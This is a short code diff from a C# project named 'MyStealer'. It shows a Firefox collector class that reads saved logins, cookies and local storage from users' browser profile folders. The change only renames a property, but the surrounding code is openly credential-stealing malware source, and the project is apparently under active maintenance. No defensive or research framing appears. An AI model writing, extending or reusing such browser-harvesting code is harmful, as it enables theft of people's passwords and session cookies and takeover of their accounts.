@@ -13,7 +13,7 @@ namespace MyStealer.Collector.Browser
 {
     public class Firefox : BrowserCollectorBase
     {
-        public override string ModuleName => "FireFox";
+        public override string Name => "FireFox";
 
         protected virtual string ProfilesPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla", "FireFox", "Profiles");
 
@@ -138,7 +138,7 @@ namespace MyStealer.Collector.Browser
                                 count++;
                                 set.Add(new BrowserLogin
                                 {
-                                    BrowserName = ModuleName,
+                                    BrowserName = Name,
                                     BrowserProfileName = profileName,
                                     Host = host,
                                     UserName = username,
@@ -192,7 +192,7 @@ namespace MyStealer.Collector.Browser
                     count++;
                     set.Add(new BrowserLogin
                     {
-                        BrowserName = ModuleName,
+                        BrowserName = Name,
                         BrowserProfileName = profileName,
                         Host = host,
                         UserName = username,
@@ -256,7 +256,7 @@ namespace MyStealer.Collector.Browser
                                 count++;
                                 set.Add(new BrowserCookie
                                 {
-                                    BrowserName = $"{ModuleName}",
+                                    BrowserName = $"{Name}",
                                     BrowserProfileName = profileName,
                                     CreationDateTime = creationTimeDate,
                                     LastAccessDateTime = lastAccessedDate,
@@ -348,7 +348,7 @@ namespace MyStealer.Collector.Browser
                                     count++;
                                     set.Add(new BrowserLocalStorage
                                     {
-                                        BrowserName = $"{ModuleName}",
+                                        BrowserName = $"{Name}",
                                         BrowserProfileName = profileName,
                                         Host = origin,
                                         Key = key,
